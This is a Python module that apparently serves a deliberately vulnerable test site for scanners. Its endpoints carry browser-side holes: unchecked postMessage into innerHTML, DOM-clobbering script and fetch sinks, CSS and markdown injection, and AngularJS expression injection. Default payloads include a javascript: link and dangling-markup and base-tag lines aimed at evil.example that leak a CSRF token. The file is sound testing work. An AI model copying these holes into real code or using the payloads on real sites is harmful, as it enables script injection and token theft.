"""Browser / client sinks: postMessage, DOM clobber, CSS inj, tabnabbing, mXSS, Angular, markdown."""

from __future__ import annotations

import html
from typing import Dict

from http_util import page, send
from registry import register


@register(
    "/xss/postmessage",
    title="postMessage origin-unchecked XSS",
    family="xss",
    expected="listener accepts data from any origin into innerHTML",
    tags=["active", "browser"],
)
def xss_postmessage(handler, params: Dict[str, str], *, head_only: bool = False) -> None:
    body = page(
        "postMessage XSS",
        "<div id='box'>waiting…</div>"
        "<script>"
        "window.addEventListener('message', function(e){"
        "  document.getElementById('box').innerHTML = e.data;"
        "});"
        "document.write('<p>send postMessage to this window</p>');"
        "</script>",
    )
    send(handler, 200, body, head_only=head_only)


@register(
    "/xss/dom-clobber",
    title="DOM clobbering (script.src sink)",
    family="xss",
    expected="named anchors/forms clobber globals used as config; script.src sink executes proof",
    tags=["active", "browser", "dom-clobber"],
)
def xss_dom_clobber(handler, params: Dict[str, str], *, head_only: bool = False) -> None:
    # Realistic injection surface: unsanitized ``html`` query (not a scanner allowlist alias).
    # Default demo uses a same-origin proof script so opening the URL alone demonstrates
    # clobber → sink → exec. Scanners must discover the property name dynamically.
    if "html" in params:
        raw = params.get("html") or ""
    else:
        href = params.get("href") or params.get("url") or "/fixtures/dom-clobber-proof.js"
        raw = f'<a id="defaultConfig" href="{href}">x</a>'
    body = page(
        "DOM clobber",
        f"<div id='sink'>{raw}</div>"
        "<p id='retained'></p>"
        "<p id='status'></p>"
        "<script>\n"
        "(function () {\n"
        "  var cfg = window.defaultConfig || { href: '/safe' };\n"
        "  var resolved = '/safe';\n"
        "  if (cfg && typeof cfg.href === 'string' && cfg.href) {\n"
        "    resolved = cfg.href;\n"
        "  } else if (cfg && typeof cfg.url === 'string' && cfg.url) {\n"
        "    resolved = cfg.url;\n"
        "  } else if (cfg && cfg.url && typeof cfg.url.value === 'string') {\n"
        "    resolved = cfg.url.value;\n"
        "  }\n"
        "  var retained = document.getElementById('retained');\n"
        "  if (retained) retained.textContent = 'cfg.url=' + resolved;\n"
        "  var s = document.createElement('script');\n"
        "  s.src = resolved;\n"
        "  s.onload = function () {\n"
        "    var st = document.getElementById('status');\n"
        "    if (st && !st.textContent) st.textContent = 'script execution confirmed';\n"
        "  };\n"
        "  s.onerror = function () {\n"
        "    var st = document.getElementById('status');\n"
        "    if (st) st.textContent = 'script load attempted';\n"
        "  };\n"
        "  document.body.appendChild(s);\n"
        "})();\n"
        "</script>"
        "<p>Inject via <code>?html=&lt;a id=… href=…&gt;</code>. "
        "Victim opens the URL — no click required. "
        "<a href='?html=x'>seed</a></p>",
    )
    send(handler, 200, body, head_only=head_only)


@register(
    "/xss/dom-clobber-safe",
    title="DOM clobber reflection-only control",
    family="xss",
    expected="same clobber HTML retained/displayed but never assigned to script.src",
    tags=["control", "fp-guard", "browser", "dom-clobber"],
)
def xss_dom_clobber_safe(handler, params: Dict[str, str], *, head_only: bool = False) -> None:
    """Negative control: live clobber HTML may be present; never reaches script.src."""
    if "html" in params:
        raw = params.get("html") or ""
    else:
        href = params.get("href") or params.get("url") or "/fixtures/dom-clobber-proof.js"
        raw = f'<a id="defaultConfig" href="{href}">x</a>'
    # Multi-line script: a // comment on a single-line <script> would eat "})();".
    body = page(
        "DOM clobber safe",
        f"<div id='sink'>{raw}</div>"
        "<p id='retained'></p>"
        "<p id='status'>no script sink</p>"
        "<script>\n"
        "(function () {\n"
        "  var cfg = window.defaultConfig || { href: '/safe' };\n"
        "  var resolved = '/safe';\n"
        "  if (cfg && typeof cfg.href === 'string' && cfg.href) {\n"
        "    resolved = cfg.href;\n"
        "  } else if (cfg && typeof cfg.url === 'string' && cfg.url) {\n"
        "    resolved = cfg.url;\n"
        "  } else if (cfg && cfg.url && typeof cfg.url.value === 'string') {\n"
        "    resolved = cfg.url.value;\n"
        "  }\n"
        "  var retained = document.getElementById('retained');\n"
        "  if (retained) retained.textContent = 'cfg.url=' + resolved;\n"
        "  /* Intentionally no createElement('script') / script.src assignment. */\n"
        "})();\n"
        "</script>"
        "<p>Control: clobber HTML may be present and retained, but never reaches "
        "<code>script.src</code>.</p>",
    )
    send(handler, 200, body, head_only=head_only)


@register(
    "/xss/dom-clobber/app-settings",
    title="DOM clobber appSettings → script.src",
    family="xss",
    expected="window.appSettings clobbered; script.src sink",
    tags=["active", "browser", "dom-clobber"],
)
def xss_dom_clobber_app_settings(handler, params: Dict[str, str], *, head_only: bool = False) -> None:
    """Different property shape than /xss/dom-clobber — scanners must discover appSettings."""
    if "html" in params:
        raw = params.get("html") or ""
    else:
        href = params.get("href") or "/fixtures/dom-clobber-proof.js"
        raw = f'<a id="appSettings" href="{href}">x</a>'
    body = page(
        "DOM clobber appSettings",
        f"<div id='sink'>{raw}</div><p id='status'></p>"
        "<script>\n"
        "(function () {\n"
        "  var settings = window.appSettings || { href: '/safe' };\n"
        "  var src = (settings && settings.href) ? settings.href : '/safe';\n"
        "  var s = document.createElement('script');\n"
        "  s.src = src;\n"
        "  document.body.appendChild(s);\n"
        "})();\n"
        "</script>",
    )
    send(handler, 200, body, head_only=head_only)


@register(
    "/xss/dom-clobber/widget-cfg",
    title="DOM clobber widgetCfg.url → fetch",
    family="xss",
    expected="form named-property clobber; fetch sink (network proof)",
    tags=["active", "browser", "dom-clobber"],
)
def xss_dom_clobber_widget_cfg(handler, params: Dict[str, str], *, head_only: bool = False) -> None:
    """Nested form clobber consumed by fetch — controlled_request_confirmed path."""
    if "html" in params:
        raw = params.get("html") or ""
    else:
        raw = (
            '<form id="widgetCfg">'
            '<input name="url" value="/fixtures/dom-clobber-proof.js">'
            "</form>"
        )
    body = page(
        "DOM clobber widgetCfg",
        f"<div id='sink'>{raw}</div><p id='status'></p>"
        "<script>\n"
        "(function () {\n"
        "  var cfg = window.widgetCfg || {};\n"
        "  var u = '/safe';\n"
        "  if (cfg && cfg.url && typeof cfg.url.value === 'string') u = cfg.url.value;\n"
        "  else if (cfg && typeof cfg.url === 'string') u = cfg.url;\n"
        "  fetch(u).then(function () {\n"
        "    var st = document.getElementById('status');\n"
        "    if (st) st.textContent = 'fetch attempted';\n"
        "  }).catch(function () {});\n"
        "})();\n"
        "</script>",
    )
    send(handler, 200, body, head_only=head_only)


@register(
    "/xss/dom-clobber/media-embed",
    title="DOM clobber mediaTarget → iframe.src",
    family="xss",
    expected="iframe.src sink from clobbered href",
    tags=["active", "browser", "dom-clobber"],
)
def xss_dom_clobber_media(handler, params: Dict[str, str], *, head_only: bool = False) -> None:
    if "html" in params:
        raw = params.get("html") or ""
    else:
        href = params.get("href") or "/fixtures/dom-clobber-proof.js"
        raw = f'<a id="mediaTarget" href="{href}">x</a>'
    body = page(
        "DOM clobber mediaTarget",
        f"<div id='sink'>{raw}</div><iframe id='frame' name='frame'></iframe>"
        "<script>\n"
        "(function () {\n"
        "  var t = window.mediaTarget || { href: 'about:blank' };\n"
        "  var f = document.getElementById('frame');\n"
        "  if (f && t && t.href) f.src = t.href;\n"
        "})();\n"
        "</script>",
    )
    send(handler, 200, body, head_only=head_only)


@register(
    "/css/inject",
    title="CSS injection / data exfil",
    family="css_injection",
    expected="attacker style reads attributes via selectors",
    tags=["active"],
)
def css_inject(handler, params: Dict[str, str], *, head_only: bool = False) -> None:
    color = params.get("theme", "blue")
    # Style reflected without sanitization
    extra = f"<style>body{{--theme:{color}}} input[name=csrf][value^=a]{{background:url('/exfil?a')}}</style>"
    body = page(
        "CSS injection",
        f"{extra}<p>theme applied</p><input name='csrf' value='abcSECRET'>"
        f"<pre>theme={html.escape(color)}</pre>",
    )
    send(handler, 200, body, head_only=head_only)


@register(
    "/tabnabbing",
    title="Reverse tabnabbing (window.opener)",
    family="tabnabbing",
    expected="target=_blank without rel=noopener",
    tags=["passive", "browser"],
)
def tabnabbing(handler, params: Dict[str, str], *, head_only: bool = False) -> None:
    body = page(
        "Tabnabbing",
        '<p>External docs: <a href="https://example.com/help" target="_blank">Open help</a></p>'
        "<p>missing rel=noopener noreferrer</p>",
    )
    send(handler, 200, body, head_only=head_only)


@register(
    "/xss/markdown",
    title="Markdown XSS",
    family="xss",
    expected="markdown renderer allows raw HTML / javascript links",
    tags=["active"],
)
def xss_markdown(handler, params: Dict[str, str], *, head_only: bool = False) -> None:
    md = params.get("md", "[xss](javascript:alert(1))")
    # Toy markdown: links + raw HTML passthrough.
    # Allow ')' inside URLs (javascript:alert(1)) by matching until the final ')'.
    import re

    if "<" in md and "script" in md.lower():
        html_out = md  # raw HTML allowed
    else:
        def _link(m: re.Match) -> str:
            return f'<a href="{m.group(2)}">{html.escape(m.group(1))}</a>'

        html_out = re.sub(r"\[([^\]]+)\]\((.+)\)", _link, md)
        if html_out == md and "[" not in md:
            html_out = html.escape(md)
    body = page("Markdown XSS", f"<div class='md'>{html_out}</div>")
    send(handler, 200, body, head_only=head_only)


@register(
    "/xss/angular",
    title="AngularJS expression injection",
    family="xss",
    expected="{{constructor}} style expressions in old AngularJS",
    tags=["active", "browser"],
)
def xss_angular(handler, params: Dict[str, str], *, head_only: bool = False) -> None:
    q = params.get("q", "{{7*7}}")
    # Local angular-lite avoids CDN dependency while still evaluating {{expr}}.
    body = page(
        "AngularJS SSTI-ish",
        "<div ng-app><p>Search: <span ng-bind>" + q + "</span></p></div>"
        "<script src='/static/angular-lite.js'></script>",
        extra_head="",
    )
    send(handler, 200, body, head_only=head_only)


@register(
    "/xss/dangling",
    title="Dangling markup injection",
    family="xss",
    expected="unclosed tags exfiltrate following HTML",
    tags=["active"],
)
def xss_dangling(handler, params: Dict[str, str], *, head_only: bool = False) -> None:
    # Default uses a single-quoted open attribute so following markup (csrf) is swallowed.
    q = params.get("q", "<img src='https://evil.example/x?")
    body = page(
        "Dangling markup",
        f"<p>Result: {q}</p>"
        '<form action="/login"><input name="csrf" value="SUPERSECRETTOKEN"><button>Go</button></form>',
    )
    send(handler, 200, body, head_only=head_only)


@register(
    "/xss/base-tag",
    title="Base tag hijack",
    family="xss",
    expected="injected <base> rewrites relative script/src",
    tags=["active"],
)
def xss_base_tag(handler, params: Dict[str, str], *, head_only: bool = False) -> None:
    q = params.get("q", "<base href='https://evil.example/'>")
    body = (
        "<!DOCTYPE html><html><head><meta charset='utf-8'><title>Base hijack</title>"
        f"{q}</head><body><h1>Base hijack</h1>"
        "<script src='/static/app.js'></script>"
        "<p>relative assets resolve via attacker base</p></body></html>"
    ).encode("utf-8")
    send(handler, 200, body, head_only=head_only)


@register(
    "/cors/localstorage",
    title="Sensitive token in localStorage",
    family="client_storage",
    expected="session token stored in localStorage (XSS-stealable)",
    tags=["passive", "browser"],
)
def cors_localstorage(handler, params: Dict[str, str], *, head_only: bool = False) -> None:
    body = page(
        "localStorage token",
        "<script>"
        "localStorage.setItem('session_token','playground-session-DO_NOT_SHIP');"
        "localStorage.setItem('api_key','AIzaSyPlaygroundClientKey');"
        "document.write('<pre>token stored in localStorage</pre>');"
        "</script>",
    )
    send(handler, 200, body, head_only=head_only)


@register(
    "/sri/missing",
    title="Third-party script without SRI",
    family="sri",
    expected="external script lacking integrity attribute",
    tags=["passive"],
)
def sri_missing(handler, params: Dict[str, str], *, head_only: bool = False) -> None:
    body = page(
        "Missing SRI",
        "<script src='https://cdn.example.com/jquery.min.js'></script>"
        "<p>third-party script without integrity=/crossorigin=</p>",
    )
    send(handler, 200, body, head_only=head_only)
